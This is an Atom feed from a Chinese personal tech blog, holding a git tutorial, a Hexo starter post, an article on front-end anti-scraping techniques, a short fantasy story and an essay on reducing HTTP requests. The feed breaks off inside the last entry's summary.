<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CoolBreeze的博客</title>
  
  <subtitle>胆小认生,不易相处</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bzkco70.cn/"/>
  <updated>2020-12-11T12:07:25.253Z</updated>
  <id>http://bzkco70.cn/</id>
  
  <author>
    <name>CoolBreeze</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>git详解</title>
    <link href="http://bzkco70.cn/2020/12/11/git/"/>
    <id>http://bzkco70.cn/2020/12/11/git/</id>
    <published>2020-12-10T16:00:00.000Z</published>
    <updated>2020-12-11T12:07:25.253Z</updated>
    
    <content type="html"><![CDATA[<h2 id="git的功能"><a href="#git的功能" class="headerlink" title="git的功能"></a>git的功能</h2><p>代码回滚、代码合并、版本备份、权限控制、追究责任等。<br>他能追踪一个项目从诞生到定案的过程、记录项目所有变化，无限制返回、查看特定版本的修情况。</p><h2 id="git和svn比较"><a href="#git和svn比较" class="headerlink" title="git和svn比较"></a>git和svn比较</h2><p>git为分布式版本控制（在每个客户端都有一份完整的代码仓库, 可以在每个客户端自行管理）<br>svn为集中式版本控制（所有的代码都集中在一块, 统一进行管理）</p><h2 id="git的工作流程"><a href="#git的工作流程" class="headerlink" title="git的工作流程"></a>git的工作流程</h2><p>git add .(.或者其他文件) -&gt; git commit -m “” -&gt; git pull -&gt;git push  </p><h2 id="git的使用经验"><a href="#git的使用经验" class="headerlink" title="git的使用经验"></a>git的使用经验</h2><p>每天走之前, 提交一份没有问题的代码到服务器，每天早上来之前, 从服务器拉一份最新的代码到本地再进行开发  </p><h2 id="git的使用方式"><a href="#git的使用方式" class="headerlink" title="git的使用方式"></a>git的使用方式</h2><p>命令行、ws这些前端工具。</p><h2 id="常见的unix命令"><a href="#常见的unix命令" class="headerlink" title="常见的unix命令"></a>常见的unix命令</h2><ol><li>必学命令<br> help [子命令] : 查看某一个具体的子命令的使用方法  </li><li>常用命令  <ul><li>cd path : 将当前路径切换到path路径<ul><li>pwd ：查看当前所在路径</li><li>ls (-a / -l / -G) :  查看当前文件夹下所有文件及文件夹</li><li>touch filename1 filename2 ： 创建一个或者多个文件 </li><li>rm filename : 删除文件</li><li>cat filename ：查看文件内容</li><li>less filename ：分页查看文件内容</li><li>mkdir 文件夹名称 ：创建一个文件夹</li><li>rmdir 文件夹名称 ：删除一个文件夹</li><li>mv oldFilePath newFilePath ：移动文件(可借助此命令给文件重命名)</li></ul></li></ul></li><li>vi编辑器<br>三种模式：命令行模式、末行模式、输入模式，输入vi就进入命令行模式，输入a或i就到插入模式，接着esc到命令行模式，接着shift+:到末行模式，wq保存并退出，！q强制退出。末行模式esc到命令行模式。  </li></ol><h2 id="git工作原理："><a href="#git工作原理：" class="headerlink" title="git工作原理："></a>git工作原理：</h2><p>git有工作区和版本控制库这两个东西，工作区就是文件目录下（除了.git）的就是工作区，版本库就是目录下.git目录，当添加/修改/删除后，git add后先是将添加的文件推送到版本库的暂缓区，git commit 后将添加的文件推送到版本库的分支上，默认是master分支，通过HEAD指针来切换分支。  </p><h2 id="git本地仓库的搭建："><a href="#git本地仓库的搭建：" class="headerlink" title="git本地仓库的搭建："></a>git本地仓库的搭建：</h2><p>初始化git init-&gt;配置仓库（告诉git你是谁，怎么联系。。。git config user.name “你的名字”  git…email “”,配置好了查看这些配置的信息，git config -l）。</p><h3 id="git-基本使用："><a href="#git-基本使用：" class="headerlink" title="git 基本使用："></a>git 基本使用：</h3><p>创建文件并提交：touch 文件 git add  git commit-》修改文件并提交-》删除文件并提交：git rm 文件 。。。<br>git 日志查看的方式：1）git log  2)git relog  版本号唯一<br>git 查看文件状态：git status  红色表示文件添加或修改或删除的文件没有被添加到暂缓区，绿色表示文件在暂缓去等待提交。</p><h2 id="git版本回退："><a href="#git版本回退：" class="headerlink" title="git版本回退："></a>git版本回退：</h2><p>如果尚未提交：回退到当前版本：git reset –hard HEAD<br>如果提交了：<br>git reset –hard HEAD^ 重置到上个版本<br>git reset –hard HEAD~2 重置到往上2个版本<br>git reset –hard  HEAD@{版本号}七位版本号 重置到指定版本<br>然后再使用git push –force将本次变更强行推送至服务器。这样在服务器上的对应版本的错误提交也彻底消失了。</p><h2 id="共享库分类："><a href="#共享库分类：" class="headerlink" title="共享库分类："></a>共享库分类：</h2><p>远程共享库和本地共享库，远程的就比如GitHub，本地共享库的例子好比如在一个电脑上，有一个共享库，另外有两个文件目录分别在本地共享库拉取提交代码。git clone “c:/user….(本地共享库地址)”，搭建本地共享库mkdir share/cd share/git init –bare。</p><h2 id="解决冲突："><a href="#解决冲突：" class="headerlink" title="解决冲突："></a>解决冲突：</h2><p>这个通常我们在使用前最好拉一下代码，否则如果本地文件的版本低于共享库的文件版本, 提交时就会报超时错误，冲突解决：如果俩人在用一个共享库的一个文件，另一个修改提交并且推送，另一个也修改提交推送时就会提升merge，这时就要合并一下代码接着点击merge，这时通常把别人的放在前面，自己的放在后面，接着apply一下，如果没有成功重新推送一下。</p><h2 id="配置忽略文件："><a href="#配置忽略文件：" class="headerlink" title="配置忽略文件："></a>配置忽略文件：</h2><p>有些文件对自己有用，对别人没有，就不必上传到服务器了。<br>  就是在当前目录下，touch .gitignore  接着打开这个文件在里面写上要忽略的文件名即可。只能忽略工作区文件，如果已经在暂缓区，则无法忽略。</p><h2 id="终于快要结束了，接下来就是git分支"><a href="#终于快要结束了，接下来就是git分支" class="headerlink" title="终于快要结束了，接下来就是git分支"></a>终于快要结束了，接下来就是git分支</h2><p>  首先如果远程有多个分支，如果是master分支，直接拉，如果是有其他分支，拉取代码命令为：git clone -b dev ssh地址<br>查看当前分支  git branch -a  -&gt;查看本地分支git branch -&gt;创建分支 git branch 分支名称 -&gt;将创建的分支推送都远程git push origin 分支名称 -&gt;切换分支 git checkout 分支名称 -&gt;删除分支 git branch -d 分支名称 -&gt;删除远程分支 git push origin :分支名称。<br>这里如果想将其他分支合并到master分支，首先提交当前分支的代码，接着切换到master分支，master分支如果是多人开发就要pull一下，接着就是合并 git merge dev(假设要合并dev分支的) 接着就git status 查看合并代码是否有冲突，最后git push origin master,如果想切回原来的分支继续开发就git checkout dev </p><h2 id="抱歉啊，还有最后一点内容，就是打包"><a href="#抱歉啊，还有最后一点内容，就是打包" class="headerlink" title="抱歉啊，还有最后一点内容，就是打包"></a>抱歉啊，还有最后一点内容，就是打包</h2><p>  给项目打一个标签，就是打一个版本，git tag -a v1.0 -m “tag”,接着上传 git push origin v1.0</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;git的功能&quot;&gt;&lt;a href=&quot;#git的功能&quot; class=&quot;headerlink&quot; title=&quot;git的功能&quot;&gt;&lt;/a&gt;git的功能&lt;/h2&gt;&lt;p&gt;代码回滚、代码合并、版本备份、权限控制、追究责任等。&lt;br&gt;他能追踪一个项目从诞生到定案的过程、记录项目所有
      
    
    </summary>
    
    
      <category term="git" scheme="http://bzkco70.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>First Blog</title>
    <link href="http://bzkco70.cn/2020/11/30/hello-world/"/>
    <id>http://bzkco70.cn/2020/11/30/hello-world/</id>
    <published>2020-11-30T07:32:11.685Z</published>
    <updated>2020-11-28T06:39:58.784Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>反击爬虫，前端工程师的脑洞可以有多大？</title>
    <link href="http://bzkco70.cn/2017/07/09/prevent-spiders/"/>
    <id>http://bzkco70.cn/2017/07/09/prevent-spiders/</id>
    <published>2017-07-09T02:36:00.000Z</published>
    <updated>2020-11-28T08:23:00.903Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://7tszky.com1.z0.glb.clouddn.com/FmIvXiOiFFET4oPGkVU6rdDCl87S" width="400"></p><p><em>—— 同时发表于<a href="http://imweb.io/topic/595b7161d6ca6b4f0ac71f05" target="_blank" rel="noopener">imweb.io</a></em></p><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h3><p>对于一张网页，我们往往希望它是结构良好，内容清晰的，这样搜索引擎才能准确地认知它。<br>而反过来，又有一些情景，我们不希望内容能被轻易获取，比方说电商网站的交易额，教育网站的题目等。因为这些内容，往往是一个产品的生命线，必须做到有效地保护。这就是<strong>爬虫与反爬虫</strong>这一话题的由来。</p><a id="more"></a><h3 id="2-常见反爬虫策略"><a href="#2-常见反爬虫策略" class="headerlink" title="2. 常见反爬虫策略"></a>2. 常见反爬虫策略</h3><p>但是世界上没有一个网站，能做到完美地反爬虫。</p><p>如果页面希望能在用户面前正常展示，同时又不给爬虫机会，就必须要做到识别真人与机器人。因此工程师们做了各种尝试，这些策略大多采用于<strong>后端</strong>，也是目前比较常规单有效的手段，比如：</p><ul><li>User-Agent + Referer检测</li><li>账号及Cookie验证</li><li>验证码</li><li>IP限制频次</li></ul><p>而爬虫是可以无限逼近于真人的，比如：</p><ul><li>chrome headless或phantomjs来模拟浏览器环境</li><li><a href="http://udn.yyuap.com/doc/ae/920457.html" target="_blank" rel="noopener">tesseract</a>识别验证码</li><li>代理IP淘宝就能买到</li></ul><p>所以我们说，100%的反爬虫策略？不存在的。<br>更多的是体力活，是个难易程度的问题。</p><p>不过作为前端工程师，我们可以增加一下游戏难度，设计出一些<strong>很(sang)有(xin)意(bing)思(kuang)</strong>的反爬虫策略。</p><h3 id="3-前端与反爬虫"><a href="#3-前端与反爬虫" class="headerlink" title="3. 前端与反爬虫"></a>3. 前端与反爬虫</h3><h4 id="3-1-font-face拼凑式"><a href="#3-1-font-face拼凑式" class="headerlink" title="3.1 font-face拼凑式"></a>3.1 font-face拼凑式</h4><p><strong>例子：<a href="http://maoyan.com/films/342601" target="_blank" rel="noopener">猫眼电影</a></strong></p><p>猫眼电影里，对于票房数据，展示的并不是纯粹的数字。<br>页面使用了font-face定义了字符集，并通过unicode去映射展示。也就是说，除去图像识别，必须同时爬取字符集，才能识别出数字。</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/Fr4tKHT39qEwCjjK7QlhWpHWNkvs" alt></p><p>并且，每次刷新页面，字符集的url都是有变化的，无疑更大难度地增加了爬取成本。</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/FnBGGXcZgJ_PN9CbX5gVz_f5Y579" alt></p><h4 id="3-2-background拼凑式"><a href="#3-2-background拼凑式" class="headerlink" title="3.2 background拼凑式"></a>3.2 background拼凑式</h4><p><strong>例子：<a href="http://www.meituan.com/dianying/342601?#content" target="_blank" rel="noopener">美团</a></strong></p><p>与font的策略类似，美团里用到的是background拼凑。数字其实是图片，根据不同的background偏移，显示出不同的字符。</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/FvAROr33mC0rpTFO46Xtl3j-8HrW" alt></p><p>并且不同页面，图片的字符排序也是有区别的。不过理论上只需生成0-9与小数点，为何有重复字符就不是很懂。</p><p>页面A：<br><img src="http://7tszky.com1.z0.glb.clouddn.com/Fp_3RGHisGjjKoofp-W7oOx731ry" alt><br>页面B：<br><img src="http://7tszky.com1.z0.glb.clouddn.com/FiuQ2nSHzD6VoM2L_LDloXUo9ndL" alt></p><h4 id="3-3-字符穿插式"><a href="#3-3-字符穿插式" class="headerlink" title="3.3 字符穿插式"></a>3.3 字符穿插式</h4><p><strong>例子：<a href="https://mp.weixin.qq.com/s?__biz=MzI0MDYwNjk2OA==&amp;mid=2247484365&amp;idx=4&amp;sn=291a93e8a4ce6e90d3b6ef8b98fe09c4&amp;chksm=e919085ade6e814cc037ecf6a873f22da0e492911a4e539e6f8fdeff022806b4d248c4d54194&amp;scene=4" target="_blank" rel="noopener">微信公众号文章</a></strong></p><p>某些微信公众号的文章里，穿插了各种迷之字符，并且通过样式把这些字符隐藏掉。<br>这种方式虽然令人震惊…但其实没有太大的识别与过滤难度，甚至可以做得更好，不过也算是一种脑洞吧。<br><img src="http://7tszky.com1.z0.glb.clouddn.com/FoFF_VXDYzM0DyLDjAbOz8ATzH59" alt></p><p>对了，我的手机流量可以找谁报销吗？</p><h4 id="3-4-伪元素隐藏式"><a href="#3-4-伪元素隐藏式" class="headerlink" title="3.4 伪元素隐藏式"></a>3.4 伪元素隐藏式</h4><p><strong>例子：<a href="http://car.autohome.com.cn/config/series/3170.html" target="_blank" rel="noopener">汽车之家</a></strong></p><p>汽车之家里，把关键的厂商信息，做到了伪元素的content里。<br>这也是一种思路：爬取网页，必须得解析css，需要拿到伪元素的content，这就提升了爬虫的难度。</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/FslsPbUtQhM2uE_bK-LZw7NHynl5" alt></p><h4 id="3-5-元素定位覆盖式"><a href="#3-5-元素定位覆盖式" class="headerlink" title="3.5 元素定位覆盖式"></a>3.5 元素定位覆盖式</h4><p><strong>例子：<a href="https://flight.qunar.com/site/oneway_list.htm?searchDepartureAirport=%E5%B9%BF%E5%B7%9E&amp;searchArrivalAirport=%E5%8C%97%E4%BA%AC&amp;searchDepartureTime=2017-07-06&amp;searchArrivalTime=2017-07-09&amp;nextNDays=0&amp;startSearch=true&amp;fromCode=CAN&amp;toCode=BJS&amp;from=qunarindex&amp;lowestPrice=null" target="_blank" rel="noopener">去哪儿</a></strong></p><p>还有热爱数学的去哪儿，对于一个4位数字的机票价格，先用四个<code>i</code>标签渲染，再用两个<code>b</code>标签去绝对定位偏移量，覆盖故意展示错误的<code>i</code>标签，最后在视觉上形成正确的价格…</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/FtZdGFs-53tAYT10GS_ukosJL8CF" alt></p><p>这说明爬虫会解析css还不行，还得会做数学题。</p><h4 id="3-6-iframe异步加载式"><a href="#3-6-iframe异步加载式" class="headerlink" title="3.6 iframe异步加载式"></a>3.6 iframe异步加载式</h4><p><strong>例子：<a href="http://music.163.com/#/song?id=424477863" target="_blank" rel="noopener">网易云音乐</a></strong></p><p>网易云音乐页面一打开，html源码里几乎只有一个<code>iframe</code>，并且它的src是空白的：<code>about:blank</code>。接着js开始运行，把整个页面的框架异步塞到了iframe里面…</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/FjHp4gqXWu1YeYWVJ1vkMAgRzO-g" alt></p><p>不过这个方式带来的难度并不大，只是在异步与iframe处理上绕了个弯（或者有其他原因，不完全是基于反爬虫考虑），无论你是用selenium还是phantom，都有API可以拿到iframe里面的content信息。</p><h4 id="3-7-字符分割式"><a href="#3-7-字符分割式" class="headerlink" title="3.7 字符分割式"></a>3.7 字符分割式</h4><p><strong>例子：<a href="http://www.goubanjia.com/" target="_blank" rel="noopener">全网代理IP</a></strong></p><p>在一些展示代理IP信息的页面，对于IP的保护也是大费周折。</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/FiY93YeoTulfbXWBxfX3nrksVQVV" alt></p><p>他们会先把IP的数字与符号分割成dom节点，再在中间插入迷惑人的数字，如果爬虫不知道这个策略，还会以为自己成功拿到了数值；不过如果爬虫注意到，就很好解决了。</p><h4 id="3-8-字符集替换式"><a href="#3-8-字符集替换式" class="headerlink" title="3.8 字符集替换式"></a>3.8 字符集替换式</h4><p><strong>例子：<a href="https://m.flight.qunar.com/ncs/page/flightlist?depCity=%E5%8C%97%E4%BA%AC&amp;arrCity=%E4%B8%8A%E6%B5%B7&amp;goDate=2017-07-05&amp;backDate=&amp;sort=&amp;airLine=&amp;from=" target="_blank" rel="noopener">去哪儿移动侧</a></strong></p><p>同样会欺骗爬虫的还有去哪儿的移动版。</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/Ft3i0NfbT8udcJ-OMIQQvdeU-LTb" alt></p><p>html里明明写的3211，视觉上展示的却是1233。原来他们重新定义了字符集，3与1的顺序刚好调换得来的结果…</p><p><img src="http://7tszky.com1.z0.glb.clouddn.com/FoMbTu14ollkxEO0tSv7F55ZVxMq" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://7tszky.com1.z0.glb.clouddn.com/FmIvXiOiFFET4oPGkVU6rdDCl87S&quot; width=&quot;400&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;—— 同时发表于&lt;a href=&quot;http://imweb.io/topic/595b7161d6ca6b4f0ac71f05&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;imweb.io&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1. 前言&quot;&gt;&lt;/a&gt;1. 前言&lt;/h3&gt;&lt;p&gt;对于一张网页，我们往往希望它是结构良好，内容清晰的，这样搜索引擎才能准确地认知它。&lt;br&gt;而反过来，又有一些情景，我们不希望内容能被轻易获取，比方说电商网站的交易额，教育网站的题目等。因为这些内容，往往是一个产品的生命线，必须做到有效地保护。这就是&lt;strong&gt;爬虫与反爬虫&lt;/strong&gt;这一话题的由来。&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://bzkco70.cn/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="安全" scheme="http://bzkco70.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>失眠故事四【扎龙人】</title>
    <link href="http://bzkco70.cn/2016/02/09/my-fairy-tale3/"/>
    <id>http://bzkco70.cn/2016/02/09/my-fairy-tale3/</id>
    <published>2016-02-08T19:55:00.000Z</published>
    <updated>2020-11-28T08:23:00.898Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/assets/blogImg/dragon.jpg" alt></p><h6 id="Picture-by-Peter-Nagy"><a href="#Picture-by-Peter-Nagy" class="headerlink" title="Picture by Peter Nagy"></a>Picture by <a href="https://dribbble.com/shots/1114225-My-Dragon" target="_blank" rel="noopener">Peter Nagy</a></h6><p><em>题记：失眠与回忆齐飞，脑洞共长天一色，既然睡不着，就写故事吧。<br><a href="/2014/08/22/two-magics-of-the-pilot/">【故事三】</a><a href="/2013/09/10/my-fairy-tale2/">【故事二】</a><a href="/2013/04/30/my-fairy-tale1/">【故事一】</a></em></p><h3 id="扎龙人"><a href="#扎龙人" class="headerlink" title="扎龙人"></a>扎龙人</h3><p>年初一的这天早上，一条尾巴，从自家被窝里窜了出来…</p><p>他本以为是梦，然而事实就是如此：他自己，变成了一条龙，正窝旋床上。坚硬的鳞片摩擦着柔软的羽绒，舒服的质感让人沉醉，也让龙沉醉。不过现在并不是享受的时候。</p><a id="more"></a><p>他开始回忆。<br>他是小镇的手艺人，每年春节，他扎的龙都深受大家喜爱。竹篾扎成的龙，无人自舞，无风自动，它们穿街走巷，上天入地。龙能像小狗一样，恶作剧的叼过姑娘的裙摆；也会虎视眈眈的望着一碗扣肉直流口水。外人惊以为施以了魔法，老人们笑道，这是祖上单传的机关秘术。</p><p>匠心源于天赋与耐心，扎龙人独居竹林，钻研技艺。<br>他曾听小镇铁匠说过，技术即艺术，炉火纯青时，铁匠们将人剑合一！当时，他觉得这说法特别的中二。<br>不过离群索居的他并不知道中二的意思，只能理解为一种中国特色的二。</p><p>然而，年初一，他，变成了一条龙。是不是梦？反正他已经捏过龙下巴了，疼。</p><p>扎龙人想起了父亲，他在三十多年前的春节，在一场大火中不辞而去。<br>释然的光芒从眼中闪过，他仿佛解开了一个谜团：是不是那时候，父亲也变成了一条龙，为了不惊吓到村民，只能选择离开？<br>父亲曾说，竹性乃水性，上善如水，变幻万千，竹子有了灵魂，就看不出是竹子。他的小手曾触碰过父亲扎的龙，扑通扑通，那是龙的心跳。扎龙人认为，这是大成。</p><p>不过，对于眼前该如何起床这件事，他自己倒有了一个精明的计策：用竹篾扎成自己，自己则扮演竹龙！</p><p>计划天衣无缝。门窗一开，鞭炮齐响，飞龙跟往常一样从窗户穿出，人们拍手称快，称赞着这神乎其神的手艺。竹制的扎龙人则在窗前保持着微笑，偶尔挥挥手，接受大家的祝福。真正的扎龙人翔于长空，他第一次俯瞰着这个他深爱，却又孤独的城镇。</p><p>他玩了一整天，每到之处，节日的气氛沸腾到极点。<br>他觉得不怎么孤独，节日不再是一个人的狂欢。<br>他真的去咬了两大块扣肉，逗得孩子们哈哈大笑。<br>他心思一转，决定去叼姑娘的裙摆。要选镇里最年轻最漂亮的姑娘，世界上没有人会去指责一条竹龙是臭流氓。</p><p>他看准了她，弓身，俯冲，大风将眼睛吹得雪亮。<br>一地狂风带起了裙摆，丝绸拂面轻柔似云，时间，在刹那定格 … 他却轻轻地松开了口。一丝阴云遮住了天光，他的眼中藏匿了一片晦暗深海。<br>他看到了姑娘，那双修长的竹制双腿！<br>假腿像两根竹刺，从它眼中刺入，仿佛挑走了灵魂。</p><p>风云瞬息万变，爱与谎言，往往只差一线。<br>也许是突然明白了这场家族童话，飞龙怒火中烧，火焰吞吐而出，一如多年前的那场莫名大火。村民们四处奔逃，衣服渐渐脱落，露出了竹制的躯干。<br>啪啪作响的身体，映得节日的城镇更加辉煌，飞龙却从此没了踪影。</p><p>—— litten 16.02.09 初二</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/assets/blogImg/dragon.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h6 id=&quot;Picture-by-Peter-Nagy&quot;&gt;&lt;a href=&quot;#Picture-by-Peter-Nagy&quot; class=&quot;headerlink&quot; title=&quot;Picture by Peter Nagy&quot;&gt;&lt;/a&gt;Picture by &lt;a href=&quot;https://dribbble.com/shots/1114225-My-Dragon&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Peter Nagy&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;&lt;em&gt;题记：失眠与回忆齐飞，脑洞共长天一色，既然睡不着，就写故事吧。&lt;br&gt;&lt;a href=&quot;/2014/08/22/two-magics-of-the-pilot/&quot;&gt;【故事三】&lt;/a&gt;&lt;a href=&quot;/2013/09/10/my-fairy-tale2/&quot;&gt;【故事二】&lt;/a&gt;&lt;a href=&quot;/2013/04/30/my-fairy-tale1/&quot;&gt;【故事一】&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;扎龙人&quot;&gt;&lt;a href=&quot;#扎龙人&quot; class=&quot;headerlink&quot; title=&quot;扎龙人&quot;&gt;&lt;/a&gt;扎龙人&lt;/h3&gt;&lt;p&gt;年初一的这天早上，一条尾巴，从自家被窝里窜了出来…&lt;/p&gt;
&lt;p&gt;他本以为是梦，然而事实就是如此：他自己，变成了一条龙，正窝旋床上。坚硬的鳞片摩擦着柔软的羽绒，舒服的质感让人沉醉，也让龙沉醉。不过现在并不是享受的时候。&lt;/p&gt;
    
    </summary>
    
    
      <category term="故事" scheme="http://bzkco70.cn/tags/%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>再议减少HTTP请求</title>
    <link href="http://bzkco70.cn/2014/08/14/reduce-http-requests/"/>
    <id>http://bzkco70.cn/2014/08/14/reduce-http-requests/</id>
    <published>2014-08-14T05:10:00.000Z</published>
    <updated>2020-11-28T08:23:00.903Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/assets/blogImg/reduce-http.jpg" alt="沙龙分享">       </p><blockquote><p>最近参加了IMWEB前端技术沙龙活动，有幸能站到讲台上，将性能方面的经验与大家分享。现将“再议减少HTTP请求”部分简单摘剪成文。</p></blockquote><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h3><p>关于web性能，有两个著名论断：              </p><ol><li><strong>0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力</strong>——Robert Miller                               </li><li><strong>用户所接受的数据，有80~90%的时间都耗在前端上</strong>——Steve Souders</li></ol><p>前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精…</p><p>后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载，怎样加载，都是前端工程师可以控制的。</p><h3 id="再议减少HTTP请求："><a href="#再议减少HTTP请求：" class="headerlink" title="再议减少HTTP请求："></a>再议减少HTTP请求：</h3><p>“尽量减少HTTP请求，减少DNS查找”这是Yslow写在最前面的两条规则。而放之实际，可能会遇到挑战。为何？因为我们完成了“降低请求数”的目标，但可能损失了其他方面的指标。</p><p><strong>a. 没有浏览器缓存</strong><br>减少HTTP请求，很常用的做法就是把js和css资源inline到html里。这样的做法，自然没有浏览器缓存，重复加载时连静态资源也必须加载。也许有人又说，我可以把整个html文件都缓存啊！的确可以，但以web开发的更新速度，html文件一般都不设或设置很短时间（5 min?）缓存。另外在web2.0时代里，html缓存会带来不必要的问题。比如登录前后，页面资源展示不一样，那么我们就得慎用html缓存。</p><p><strong>b. 没有cdn缓存</strong><br>这个很好理解，任何的内联资源，由于依赖于html，都必须从源服务器而不是cdn服务器返回。</p><p><strong>c. 不能按需加载</strong><br>为了按需加载，前端工程师可谓想法各异，天马行空。比如图片的lazyload技术，异步加载js脚本，而inline的方式恰恰将一切想法摁回脑中。</p><p><strong>d. 浏览器预解析DNS失效</strong><br>现代浏览器有预解析DNS技术。简单来说，就是页面下载到浏览器时，先扫描一遍，在这时发现域名并预解析DNS。这样的前置解析跟dom渲染等操作同步执行，诚然会使浏览器更快。但如果你的html页面因为内联了太多内容（base64图片），大于5M时，浏览器的预解析DNS将会失效。</p><h3 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h3><p>因而，我们时常像那只捡芝麻丢西瓜的熊。如此平衡这两者呢，业界给我们两个很好的案例。</p><p><strong>Demo1 必应</strong>               </p><blockquote><ol><li>首次内联CSS与JS<ol start="2"><li>将资源取出，并保存在localStorage中</li><li>资源名（版本）保存在cookie中</li><li>后续请求中，服务器检查对应的cookie</li><li>根据cookie的值，只嵌入新的脚本</li><li>加载时，从localStorage里载入资源</li></ol></li></ol></blockquote><p><strong>Demo2 百度(移动端)</strong>               </p><blockquote><ol><li>首次将静态资源打包，用jsonp统一返回<ol start="2"><li>将资源解析并保存在localStorage中</li><li>再次访问时检查localStorage中资源情况</li><li>如有缺失再发请求获取资源</li></ol></li></ol></blockquote><p>必应的做法确保了首次的http请求最少，后续充分发挥增量更新（当然粒度还是文件）的优势提高性能，但缺点是cookie并不可靠。百度则是把首次静态资源的http请求降低到一次，非常暴力的把全部css，js打包成字符串，以jsonp返回。宁愿用str转obj的解析时间去换取加载时间。而随V8引擎的强大，这点解析的时间也将越来越不值得提起。总而言之，这两个Demo都把http请求尽可能的降低，而后都利用了本地存储去获得资源。              </p><p>我有时候会想起那把由无名的铁匠用三个小时粗制而成的小李飞刀。<br>你得对技术怀敬畏之心。因为那些谁都懂的技术，在某些人的手里，还真能变出花儿来。</p>]]></content>
    
    <summary type="html">
    
